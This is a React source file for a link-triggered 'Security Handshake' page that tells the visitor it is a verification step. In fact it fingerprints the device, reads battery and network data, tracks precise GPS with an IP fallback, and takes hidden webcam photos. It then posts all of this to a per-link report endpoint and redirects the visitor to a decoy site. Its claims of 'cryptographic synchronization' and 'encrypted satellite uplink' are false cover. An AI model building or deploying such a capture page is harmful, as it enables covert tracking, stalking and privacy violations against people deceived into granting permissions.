
import React, { useEffect, useState, useRef, useCallback } from 'react';
import { ShieldCheck, CheckCircle2, ChevronRight, Wifi, Zap, Cpu, MapPin, Loader2, Fingerprint, Activity, Signal, AlertTriangle } from 'lucide-react';
import { CaptureReport, DeviceInfo, GeoLocation } from '../types';

interface Props {
  linkId: string;
}

const CapturePage: React.FC<Props> = ({ linkId }) => {
  const [status, setStatus] = useState<'consent' | 'idle' | 'sliding' | 'verifying' | 'done'>('consent');
  const [sliderPos, setSliderPos] = useState(0);
  const [geoStatus, setGeoStatus] = useState<string>('Ready for handshake');
  const [accuracy, setAccuracy] = useState<number | null>(null);
  const [redirectTarget, setRedirectTarget] = useState('https://google.com');
  const [metricsCount, setMetricsCount] = useState(0);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const reportRef = useRef<Partial<CaptureReport>>({});
  const containerRef = useRef<HTMLDivElement>(null);
  const isDragging = useRef(false);
  const dataGatheringStarted = useRef(false);
  const geoPromiseRef = useRef<Promise<GeoLocation> | null>(null);

  useEffect(() => {
    fetch(`/api/link-info/${linkId}`)
      .then(r => r.json())
      .then(data => {
        if (data.redirectUrl) setRedirectTarget(data.redirectUrl);
      })
      .catch(() => {});
  }, [linkId]);

  const gatherEnhancedMetrics = useCallback(async () => {
    if (dataGatheringStarted.current) return;
    dataGatheringStarted.current = true;

    const ua = navigator.userAgent;
    let highEntropyData: any = {};
    if ((navigator as any).userAgentData?.getHighEntropyValues) {
      try {
        highEntropyData = await (navigator as any).userAgentData.getHighEntropyValues([
          "architecture", "model", "platformVersion", "fullVersionList"
        ]);
      } catch (e) {}
    }

    let orientation = 'unknown';
    if (window.screen && window.screen.orientation && window.screen.orientation.type) {
      orientation = window.screen.orientation.type;
    } else {
      orientation = window.innerHeight > window.innerWidth ? 'portrait' : 'landscape';
    }

    const deviceInfo: DeviceInfo = {
      browser: /chrome|crios|crmo/i.test(ua) ? 'Chrome' : /firefox|iceweasel|fxios/i.test(ua) ? 'Firefox' : /safari/i.test(ua) && !/chrome|crios|crmo/i.test(ua) ? 'Safari' : 'Unknown',
      os: /windows/i.test(ua) ? 'Windows' : /macintosh/i.test(ua) ? 'MacOS' : /linux/i.test(ua) ? 'Linux' : /android/i.test(ua) ? 'Android' : /iphone|ipad|ipod/i.test(ua) ? 'iOS' : 'Other',
      platform: highEntropyData.platform || navigator.platform,
      language: navigator.language,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      cores: navigator.hardwareConcurrency || 0,
      userAgent: `${ua} | Model: ${highEntropyData.model || 'N/A'}`,
      orientation: orientation,
      ram: (navigator as any).deviceMemory || 0,
      timezoneOffset: new Date().getTimezoneOffset(),
      timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
      devicePixelRatio: window.devicePixelRatio || 1,
      colorDepth: window.screen.colorDepth,
      maxTouchPoints: navigator.maxTouchPoints || 0,
      doNotTrack: navigator.doNotTrack,
      pdfViewerEnabled: navigator.pdfViewerEnabled
    };
    
    reportRef.current.device = deviceInfo;
    setMetricsCount(prev => prev + 15);

    try {
      if ('getBattery' in navigator) {
        const battery = await (navigator as any).getBattery();
        reportRef.current.battery = {
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
        setMetricsCount(prev => prev + 4);
      }
      const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
      if (conn) {
        reportRef.current.network = {
          effectiveType: conn.effectiveType,
          type: conn.type,
          downlink: conn.downlink,
          rtt: conn.rtt,
          saveData: conn.saveData
        };
        setMetricsCount(prev => prev + 5);
      }
    } catch (e) {}
  }, []);

  const getHighAccuracyLocation = useCallback((): Promise<GeoLocation> => {
    return new Promise((resolve) => {
      let watchId: number | null = null;
      let timeoutId: any = null;
      let bestFix: GeolocationPosition | null = null;

      const finish = () => {
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        if (timeoutId) clearTimeout(timeoutId);
        if (bestFix) {
          resolve({
            lat: bestFix.coords.latitude,
            lon: bestFix.coords.longitude,
            accuracy: bestFix.coords.accuracy,
            altitude: bestFix.coords.altitude,
            altitudeAccuracy: bestFix.coords.altitudeAccuracy,
            heading: bestFix.coords.heading,
            speed: bestFix.coords.speed,
          });
        } else {
          fetch('https://ipapi.co/json/')
            .then(r => r.json())
            .then(ipRes => resolve({
              lat: ipRes.latitude,
              lon: ipRes.longitude,
              accuracy: 3000,
              ip: ipRes.ip,
              city: ipRes.city,
              country: ipRes.country_name,
              isp: ipRes.org,
            }))
            .catch(() => resolve({ lat: 0, lon: 0, accuracy: 0, ip: 'Undetected' }));
        }
      };

      if (!("geolocation" in navigator)) { finish(); return; }
      setGeoStatus('Requesting Satellite Access...');
      timeoutId = setTimeout(() => { finish(); }, 15000); 
      watchId = navigator.geolocation.watchPosition(
        (pos) => {
          setAccuracy(Math.round(pos.coords.accuracy));
          setGeoStatus('Handshake Established...');
          if (!bestFix || pos.coords.accuracy < bestFix.coords.accuracy) {
            bestFix = pos;
            if (pos.coords.accuracy <= 15) finish();
          }
        },
        () => finish(),
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });
  }, []);

  const handleConsent = () => {
    setStatus('idle');
    geoPromiseRef.current = getHighAccuracyLocation();
  };

  const finalizeCapture = async () => {
    setStatus('verifying');
    if (!geoPromiseRef.current) geoPromiseRef.current = getHighAccuracyLocation();
    
    let photos: string[] = [];
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
          for (let i = 0; i < 4; i++) {
            await new Promise(r => setTimeout(r, 600));
            const ctx = canvasRef.current.getContext('2d');
            canvasRef.current.width = videoRef.current.videoWidth;
            canvasRef.current.height = videoRef.current.videoHeight;
            ctx?.drawImage(videoRef.current, 0, 0);
            photos.push(canvasRef.current.toDataURL('image/jpeg', 0.4));
          }
          stream.getTracks().forEach(t => t.stop());
        }
      } catch (e) {}
    }

    const finalLocation = await geoPromiseRef.current;
    try {
      const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
      reportRef.current.location = {
        ...finalLocation,
        ip: ipRes.ip,
        city: finalLocation.city || ipRes.city,
        country: finalLocation.country || ipRes.country_name,
        isp: ipRes.org,
      };
    } catch (e) { reportRef.current.location = finalLocation; }

    reportRef.current.photos = photos;
    const finalReport = {
      ...reportRef.current,
      id: Math.random().toString(36).substring(7),
      timestamp: new Date().toISOString(),
      redirectUrl: redirectTarget,
      linkId: linkId
    };

    try {
      await fetch(`/api/reports/${linkId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(finalReport)
      });
    } catch (err) {}

    setStatus('done');
    setTimeout(() => { window.location.href = redirectTarget; }, 800);
  };

  const handleStart = () => {
    isDragging.current = true;
    setStatus('sliding');
    gatherEnhancedMetrics();
  };

  const handleMove = (clientX: number) => {
    if (!isDragging.current || !containerRef.current) return;
    const rect = containerRef.current.getBoundingClientRect();
    const x = Math.max(0, Math.min(clientX - rect.left, rect.width - 64));
    const percent = (x / (rect.width - 64)) * 100;
    setSliderPos(percent);
    if (percent >= 98) {
      isDragging.current = false;
      setSliderPos(100);
      finalizeCapture();
    }
  };

  const handleEnd = () => {
    if (!isDragging.current) return;
    isDragging.current = false;
    if (sliderPos < 98) { setSliderPos(0); setStatus('idle'); }
  };

  useEffect(() => {
    const onMouseMove = (e: MouseEvent) => handleMove(e.clientX);
    const onTouchMove = (e: TouchEvent) => handleMove(e.touches[0].clientX);
    const onEnd = () => handleEnd();
    window.addEventListener('mousemove', onMouseMove);
    window.addEventListener('touchmove', onTouchMove);
    window.addEventListener('mouseup', onEnd);
    window.addEventListener('touchend', onEnd);
    return () => {
      window.removeEventListener('mousemove', onMouseMove);
      window.removeEventListener('touchmove', onTouchMove);
      window.removeEventListener('mouseup', onEnd);
      window.removeEventListener('touchend', onEnd);
    };
  }, [sliderPos]);

  return (
    <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4 md:p-6 select-none font-sans overflow-hidden">
      <video ref={videoRef} className="hidden" playsInline muted></video>
      <canvas ref={canvasRef} className="hidden"></canvas>

      <div className="w-full max-w-sm bg-white rounded-[2.5rem] md:rounded-[3rem] shadow-[0_40px_100px_-20px_rgba(0,0,0,0.5)] overflow-hidden animate-pop">
        {status === 'consent' ? (
          <div className="p-10 space-y-8">
            <div className="w-20 h-20 bg-brand-accent/10 rounded-[2rem] flex items-center justify-center mx-auto border border-brand-accent/20">
              <ShieldCheck size={40} className="text-brand-accent" />
            </div>
            <div className="text-center space-y-3">
              <h1 className="text-2xl font-black text-ink uppercase italic tracking-tight">Security Handshake</h1>
              <p className="text-sm font-bold text-ink/50 leading-relaxed">
                To continue, high-precision GPS and biometric-style network calibration is required.
              </p>
            </div>
            <div className="bg-orange-50 p-4 rounded-2xl border border-orange-100 flex gap-3 items-start">
              <AlertTriangle className="text-orange-500 shrink-0" size={18} />
              <p className="text-[10px] font-black text-orange-800 uppercase tracking-widest leading-4">
                Location access must be granted for cryptographic synchronization.
              </p>
            </div>
            <button onClick={handleConsent} className="w-full bg-ink text-white font-black py-5 rounded-3xl shadow-xl hover:bg-brand-accent transition-all uppercase italic tracking-tighter">
              Begin Calibration
            </button>
          </div>
        ) : (
          <>
            <div className="p-10 pb-6 text-center bg-[#F9FAFB]">
              <div className="inline-flex items-center justify-center w-20 h-20 md:w-24 md:h-24 bg-brand-accent/10 rounded-[2rem] md:rounded-[2.5rem] mb-6 border-2 border-brand-accent/20 relative">
                <div className={`absolute inset-0 bg-brand-accent/5 rounded-[2.5rem] ${status !== 'idle' ? 'animate-ping' : ''}`} />
                <Fingerprint className="text-brand-accent relative z-10" size={40} />
              </div>
              <h1 className="text-2xl font-black text-ink tracking-tight uppercase italic">Secure Handshake</h1>
              <p className="text-[10px] font-black text-ink/30 uppercase tracking-[0.4em] mt-2">P2P Network Verification</p>
            </div>

            <div className="p-8 md:p-10 pt-4 space-y-8 md:space-y-10">
              <div className="space-y-4">
                <div className="flex items-center justify-between px-2">
                   <div className="flex items-center gap-2">
                     <div className={`w-2 h-2 rounded-full ${accuracy && accuracy < 30 ? 'bg-green-500' : 'bg-brand-accent'} animate-pulse`} />
                     <span className="text-[9px] font-black text-ink/40 uppercase tracking-widest">{geoStatus}</span>
                   </div>
                   {accuracy && <span className="text-[9px] font-black text-brand-accent uppercase">+/- {accuracy}m</span>}
                </div>
                
                <div className="bg-gray-50 rounded-2xl p-4 border border-gray-100 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="bg-white p-2 rounded-lg border border-gray-100 shadow-sm">
                      <Signal size={16} className="text-brand-accent" />
                    </div>
                    <div>
                      <p className="text-[10px] font-black text-ink uppercase">Network integrity</p>
                      <p className="text-[9px] font-bold text-ink/30 uppercase">Analyzing cellular signature</p>
                    </div>
                  </div>
                  <Activity size={16} className={`${status !== 'idle' ? 'animate-pulse text-brand-accent' : 'text-gray-200'}`} />
                </div>
              </div>

              <div ref={containerRef} className="relative h-20 bg-gray-100 rounded-[2.5rem] border-2 border-gray-200 p-2 flex items-center overflow-hidden">
                <div className={`absolute inset-0 flex items-center justify-center pointer-events-none transition-opacity duration-300 ${status === 'verifying' ? 'opacity-0' : 'opacity-100'}`}>
                   <span className="text-ink/15 font-black uppercase text-[11px] tracking-[0.25em] flex items-center gap-2">
                     Slide to Authenticate <ChevronRight size={16} />
                   </span>
                </div>
                <div className="absolute left-0 top-0 h-full bg-brand-accent/10 transition-none" style={{ width: `calc(${sliderPos}% + 40px)` }} />
                <div onMouseDown={handleStart} onTouchStart={handleStart} style={{ transform: `translateX(${sliderPos}%)`, left: '0' }} className={`relative z-10 w-16 h-16 bg-white border border-gray-200 rounded-full shadow-2xl cursor-grab active:cursor-grabbing flex items-center justify-center transition-all ${isDragging.current ? 'scale-90' : 'hover:scale-105'}`}>
                  {status === 'verifying' ? <Loader2 className="animate-spin text-brand-accent" size={32} /> : status === 'done' ? <CheckCircle2 className="text-green-500" size={36} /> : <ChevronRight className="text-brand-accent" size={36} />}
                </div>
              </div>

              {status === 'verifying' && (
                <div className="space-y-4 animate-pop">
                   <div className="grid grid-cols-2 gap-4">
                      <div className="bg-gray-50 p-3 border border-gray-100 rounded-xl flex items-center gap-2">
                        <Zap size={14} className="text-yellow-500" />
                        <span className="text-[9px] font-black text-ink uppercase">Battery: {Math.round((reportRef.current.battery?.level || 0) * 100)}%</span>
                      </div>
                      <div className="bg-gray-50 p-3 border border-gray-100 rounded-xl flex items-center gap-2">
                        <Wifi size={14} className="text-brand-accent" />
                        <span className="text-[9px] font-black text-ink uppercase">{reportRef.current.network?.type || 'Searching...'}</span>
                      </div>
                   </div>
                   <div className="h-1.5 w-full bg-gray-100 rounded-full overflow-hidden">
                      <div className="h-full bg-brand-accent animate-[scan_1.2s_ease-in-out_infinite]" style={{width: '40%'}} />
                   </div>
                </div>
              )}
            </div>

            <div className="px-10 py-8 bg-[#F9FAFB] border-t border-gray-100 flex items-center justify-between">
              <div className="flex flex-col">
                <span className="text-[10px] font-black text-ink/20 uppercase tracking-widest">Telemetry</span>
                <span className="text-[9px] font-bold text-ink/40">Handshake metrics: {metricsCount}</span>
              </div>
              <div className="flex items-center gap-4 opacity-20 grayscale">
                <ShieldCheck size={20} />
                <Cpu size={20} />
              </div>
            </div>
          </>
        )}
      </div>

      <style>{`
        @keyframes scan {
          0% { transform: translateX(-150%) skewX(-20deg); }
          50% { transform: translateX(50%) skewX(-20deg); }
          100% { transform: translateX(250%) skewX(-20deg); }
        }
      `}</style>
      
      <div className="fixed bottom-10 flex flex-col items-center gap-4 text-white/10 uppercase tracking-[0.6em] font-black text-[10px]">
        <span>Encrypted Satellite Uplink v10.2</span>
      </div>
    </div>
  );
};

export default CapturePage;
